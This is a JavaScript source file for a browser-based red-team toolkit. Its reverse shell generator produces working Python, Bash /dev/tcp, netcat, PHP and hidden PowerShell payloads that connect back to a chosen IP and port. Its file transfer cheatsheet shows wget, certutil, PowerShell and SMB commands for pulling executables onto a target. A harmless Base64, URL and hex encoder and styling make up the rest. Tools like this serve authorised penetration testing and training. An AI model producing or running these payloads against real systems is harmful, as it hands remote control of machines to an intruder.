/* ==================== RED TEAM UTILITY BELT 🛠️💣 ==================== */

window.UtilityBelt = {
    // --- STATE ---
    activeTool: 'shell-gen',
    shellIP: '192.168.1.5',
    shellPort: '4444',
    shellType: 'python',

    // --- INIT ---
    init() {
        this.render();
    },

    // --- RENDER UI ---
    render() {
        const container = document.getElementById('utility-app');
        if (!container) {
            return `
                <div id="utility-app" class="utility-app fade-in">
                    ${this.renderSidebar()}
                    <div id="utility-content" class="utility-content">
                        ${this.renderCurrentTool()}
                    </div>
                </div>
                ${this.getStyles()}
                <script>setTimeout(() => UtilityBelt.updateShellOutput(), 100);</script>
            `;
        } else {
            document.getElementById('utility-content').innerHTML = this.renderCurrentTool();
            document.querySelectorAll('.util-nav-item').forEach(el => el.classList.remove('active'));
            document.querySelector(`.util-nav-item[data-tool="${this.activeTool}"]`)?.classList.add('active');
        }
    },

    renderSidebar() {
        return `
            <div class="util-sidebar">
                <div class="util-logo"><i class="fas fa-tools"></i> UTILITY BELT</div>
                <div class="util-nav">
                    <div class="util-nav-item ${this.activeTool === 'shell-gen' ? 'active' : ''}" data-tool="shell-gen" onclick="UtilityBelt.switchTool('shell-gen')">
                        <i class="fas fa-terminal"></i> Rev Shell Gen
                    </div>
                    <div class="util-nav-item ${this.activeTool === 'encoder' ? 'active' : ''}" data-tool="encoder" onclick="UtilityBelt.switchTool('encoder')">
                        <i class="fas fa-code"></i> Encoder / Decoder
                    </div>
                    <div class="util-nav-item ${this.activeTool === 'transfer' ? 'active' : ''}" data-tool="transfer" onclick="UtilityBelt.switchTool('transfer')">
                        <i class="fas fa-exchange-alt"></i> File Transfer
                    </div>
                </div>
            </div>
        `;
    },

    renderCurrentTool() {
        switch (this.activeTool) {
            case 'shell-gen': return this.renderShellGen();
            case 'encoder': return this.renderEncoder();
            case 'transfer': return this.renderTransfer();
            default: return this.renderShellGen();
        }
    },

    // --- 1. REVERSE SHELL GENERATOR ---
    renderShellGen() {
        return `
            <div class="util-panel">
                <h2>Reverse Shell Generator</h2>
                <div class="config-row">
                    <div class="inp-group">
                        <label>LHOST (Your IP)</label>
                        <input type="text" id="lhost" value="${this.shellIP}" oninput="UtilityBelt.updateShellConfig('ip', this.value)">
                    </div>
                    <div class="inp-group">
                        <label>LPORT</label>
                        <input type="text" id="lport" value="${this.shellPort}" oninput="UtilityBelt.updateShellConfig('port', this.value)">
                    </div>
                    <div class="inp-group">
                        <label>Language</label>
                        <select id="shell-lang" onchange="UtilityBelt.updateShellConfig('type', this.value)">
                            <option value="python" ${this.shellType === 'python' ? 'selected' : ''}>Python</option>
                            <option value="bash" ${this.shellType === 'bash' ? 'selected' : ''}>Bash</option>
                            <option value="powershell" ${this.shellType === 'powershell' ? 'selected' : ''}>PowerShell</option>
                            <option value="php" ${this.shellType === 'php' ? 'selected' : ''}>PHP</option>
                            <option value="netcat" ${this.shellType === 'netcat' ? 'selected' : ''}>Netcat</option>
                        </select>
                    </div>
                </div>

                <div class="output-box">
                    <div class="output-header">Payload <button class="btn-copy" onclick="UtilityBelt.copyPayload()"><i class="fas fa-copy"></i> Copy</button></div>
                    <textarea id="shell-payload" readonly></textarea>
                </div>
            </div>
        `;
    },

    updateShellConfig(key, val) {
        if (key === 'ip') this.shellIP = val;
        if (key === 'port') this.shellPort = val;
        if (key === 'type') this.shellType = val;
        this.updateShellOutput();
    },

    updateShellOutput() {
        const el = document.getElementById('shell-payload');
        if (!el) return;

        const ip = this.shellIP;
        const port = this.shellPort;
        let payload = '';

        switch (this.shellType) {
            case 'python':
                payload = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
                break;
            case 'bash':
                payload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
                break;
            case 'netcat':
                payload = `nc -e /bin/sh ${ip} ${port}`;
                break;
            case 'php':
                payload = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
                break;
            case 'powershell':
                payload = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
                break;
        }
        el.value = payload;
    },

    copyPayload() {
        const el = document.getElementById('shell-payload');
        el.select();
        document.execCommand('copy');
        alert('Payload Copied!');
    },

    // --- 2. ENCODER / DECODER ---
    renderEncoder() {
        return `
            <div class="util-panel">
                <h2>Data Encoder / Decoder</h2>
                <div class="encoder-grid">
                    <div>
                        <label>Input</label>
                        <textarea id="enc-input" oninput="UtilityBelt.processEncode()"></textarea>
                    </div>
                     <div>
                        <label>Output</label>
                        <textarea id="enc-output" readonly></textarea>
                    </div>
                </div>
                <div class="enc-controls">
                    <button class="btn-enc active" id="mode-b64" onclick="UtilityBelt.setEncMode('b64')">Base64</button>
                    <button class="btn-enc" id="mode-url" onclick="UtilityBelt.setEncMode('url')">URL</button>
                    <button class="btn-enc" id="mode-hex" onclick="UtilityBelt.setEncMode('hex')">Hex</button>
                </div>
                <div class="enc-toggle">
                     <label><input type="radio" name="enc-dir" value="encode" checked onchange="UtilityBelt.processEncode()"> Encode</label>
                     <label><input type="radio" name="enc-dir" value="decode" onchange="UtilityBelt.processEncode()"> Decode</label>
                </div>
            </div>
        `;
    },

    currentEncMode: 'b64',
    setEncMode(mode) {
        this.currentEncMode = mode;
        document.querySelectorAll('.btn-enc').forEach(b => b.classList.remove('active'));
        document.getElementById(`mode-${mode}`).classList.add('active');
        this.processEncode();
    },

    processEncode() {
        const input = document.getElementById('enc-input').value;
        const output = document.getElementById('enc-output');
        const dir = document.querySelector('input[name="enc-dir"]:checked').value;

        try {
            if (this.currentEncMode === 'b64') {
                output.value = dir === 'encode' ? btoa(input) : atob(input);
            } else if (this.currentEncMode === 'url') {
                output.value = dir === 'encode' ? encodeURIComponent(input) : decodeURIComponent(input);
            } else if (this.currentEncMode === 'hex') {
                if (dir === 'encode') {
                    output.value = input.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
                } else {
                    output.value = input.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
                }
            }
        } catch (e) {
            output.value = '[Error] Invalid Input for Decoding';
        }
    },

    // --- 3. FILE TRANSFER HELPER ---
    renderTransfer() {
        return `
             <div class="util-panel">
                <h2>File Transfer Cheatsheet</h2>
                <div class="transfer-list">
                    
                    <div class="transfer-card">
                        <h3><i class="fab fa-python"></i> Python HTTP Server (Sender)</h3>
                        <code>python3 -m http.server 80</code>
                        <div class="desc">Host in directory of file to send.</div>
                    </div>

                    <div class="transfer-card">
                        <h3><i class="fas fa-download"></i> Wget (Receiver - Linux)</h3>
                        <code>wget http://${this.shellIP}/file.exe -O /tmp/file.exe</code>
                    </div>

                    <div class="transfer-card">
                        <h3><i class="fab fa-windows"></i> CertUtil (Receiver - Windows)</h3>
                        <code>certutil -urlcache -split -f "http://${this.shellIP}/file.exe" file.exe</code>
                    </div>

                     <div class="transfer-card">
                        <h3><i class="fas fa-terminal"></i> PowerShell (Receiver - Windows)</h3>
                        <code>iwr -uri http://${this.shellIP}/file.exe -OutFile file.exe</code>
                    </div>

                     <div class="transfer-card">
                        <h3><i class="fas fa-network-wired"></i> SMB Server (Impacket)</h3>
                        <code>impacket-smbserver shareName $(pwd) -smb2support</code>
                        <div class="desc">Windows: copy \\\\${this.shellIP}\\shareName\\file.exe .</div>
                    </div>

                </div>
            </div>
        `;
    },

    switchTool(tool) {
        this.activeTool = tool;
        this.render();
        if (tool === 'shell-gen') setTimeout(() => this.updateShellOutput(), 50);
    },

    getStyles() {
        return `
        <style>
            .utility-app { display: flex; height: calc(100vh - 60px); background: #0f0f10; color: #e2e8f0; font-family: 'Consolas', sans-serif; }
            .util-sidebar { width: 220px; background: #111; border-right: 1px solid #333; display: flex; flex-direction: column; }
            .util-logo { padding: 20px; font-size: 1.1rem; font-weight: bold; color: #ff3333; border-bottom: 1px solid #333; }
            
            .util-nav { padding: 20px 0; }
            .util-nav-item { padding: 15px 20px; cursor: pointer; color: #888; display: flex; gap: 10px; align-items: center; transition: 0.2s; }
            .util-nav-item:hover { color: #fff; background: #222; }
            .util-nav-item.active { color: #fff; background: #ff3333; font-weight: bold; }
            
            .utility-content { flex: 1; padding: 30px; overflow-y: auto; background: #000; }
            
            .util-panel h2 { margin-top: 0; color: #ff3333; border-bottom: 2px solid #333; padding-bottom: 10px; margin-bottom: 25px; }
            
            /* SHELL GEN */
            .config-row { display: flex; gap: 20px; margin-bottom: 20px; }
            .inp-group { flex: 1; display: flex; flex-direction: column; }
            .inp-group label { color: #888; margin-bottom: 5px; font-size: 0.9rem; }
            input, select, textarea { padding: 12px; background: #1a1a1a; border: 1px solid #333; color: #0f0; font-family: 'Consolas', monospace; border-radius: 4px; outline: none; }
            input:focus, select:focus, textarea:focus { border-color: #ff3333; }
            
            .output-box { margin-top: 20px; }
            .output-header { display: flex; justify-content: space-between; margin-bottom: 5px; color: #aaa; font-size: 0.9rem; }
            #shell-payload { width: 100%; height: 100px; resize: none; font-size: 1rem; }
            .btn-copy { background: #333; color: #fff; border: none; padding: 2px 8px; cursor: pointer; font-size: 0.8rem; border-radius: 4px; }
            .btn-copy:hover { background: #555; }
            
            /* ENCODER */
            .encoder-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
            .encoder-grid textarea { width: 100%; height: 200px; resize: none; }
            .enc-controls { margin: 20px 0; display: flex; gap: 10px; justify-content: center; }
            .btn-enc { padding: 8px 20px; background: #222; border: 1px solid #444; color: #888; cursor: pointer; border-radius: 20px; }
            .btn-enc.active { background: #ff3333; color: #fff; border-color: #ff3333; }
            .enc-toggle { text-align: center; }
            .enc-toggle label { margin: 0 10px; cursor: pointer; }
            
            /* TRANSFER */
            .transfer-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 20px; }
            .transfer-card { background: #111; padding: 20px; border: 1px solid #333; border-radius: 8px; }
            .transfer-card h3 { color: #fff; font-size: 1rem; margin-top: 0; display: flex; align-items: center; gap: 10px; }
            .transfer-card code { display: block; background: #000; padding: 10px; border-left: 3px solid #ff3333; color: #0f0; margin: 10px 0; font-size: 0.9rem; overflow-x: auto; white-space: nowrap; }
            .transfer-card .desc { color: #666; font-size: 0.8rem; font-style: italic; }
        </style>
        `;
    }
};

function pageUtilityBelt() {
    return UtilityBelt.render();
}
